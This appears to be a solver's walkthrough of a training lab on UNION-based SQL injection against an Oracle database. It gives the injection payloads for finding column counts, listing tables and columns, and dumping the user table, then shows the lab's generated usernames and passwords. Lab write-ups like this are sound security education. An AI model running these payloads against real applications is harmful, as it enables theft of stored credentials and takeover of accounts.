## Lab: SQL injection attack, listing the database contents on Oracle.

- This lab contains a SQL injection vulnerability in the product category filter.
- The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
- The application has a login function, and the database contains a table that holds usernames and passwords.
- You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

## To solve the lab, log in as the `administrator` user.

# Use Burp Suite to intercept and modify the request that sets the product category filter.

# Determine the number of columns that are being returned by the query and which columns contain text data.

# check columns
```
' UNION SELECT NULL,NULL--
```
- there are two columns.

# Verify that the query is returning two columns, both of which contain text
```
'+UNION+SELECT+'abc','def'+FROM+dual--
```
- Both contains text.

# Use the following payload to retrieve the list of tables in database
```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

# Find the name of the table containing user credentials.
- USERS_FSFUEO

# Use the following payload to retrieve the details of the columns in the table:
```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_FSFUEO'--
```
- PASSWORD_AJEMRE
- USERNAME_LKFIAO
- EMAIL

# Use the following payload to retrieve the usernames and passwords for all users.
```
'+UNION+SELECT+USERNAME_LKFIAO,+PASSWORD_AJEMRE+FROM+USERS_FSFUEO--
```

# here we go all users id and password are displayed.
- administrator : g6iinaf4av1119x0mhav
- carlos : 2bxrjaoja7cb32nupsgw
- wiener : 3adtb8rxhjbdsmxkexeb

# login using credentials of administrator
- administrator : g6iinaf4av1119x0mhav


# Lab solved
Congratulations, you solved the lab! :)


